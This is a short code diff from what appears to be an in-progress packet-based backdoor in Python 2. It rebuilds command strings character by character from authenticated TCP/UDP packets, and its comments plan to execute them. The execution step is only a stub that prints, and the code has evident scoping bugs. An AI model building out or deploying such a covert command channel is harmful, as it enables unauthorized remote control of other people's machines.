@@ -26,7 +26,7 @@ def packetHandler(packet):
 	if (authenticated(packet)):
 		pacType = checkType(packet)
 		ip, protoH, data = stripPacket(packet, pacType)
-		executeCommand(ip, protoH, data, pacType)
+		checkCommand(ip, protoH, data, pacType)
 
 def stripPacket(packet, proto):
 	ipLength = 20
@@ -83,7 +83,7 @@ def authenticated(packet):
 
  	return False
 
-def executeCommand(ip, proto, data, pacType):
+def checkCommand(ip, proto, data, pacType):
 	character = ''
 
 	if pacType == 'tcp':
@@ -95,7 +95,13 @@ def executeCommand(ip, proto, data, pacType):
 
 	# print proto
 	if character != 15:
-		print chr(character)
+		command += chr(character)
 	else:
-		print "end of command"
+		executeCommand(ip[9])
 
+def executeCommand(srcAddress):
+	# check if command is within the backdoor
+	# otherwise, exec it
+	# clear command at the end
+	print command + " from " + srcAddress
+	command = ""
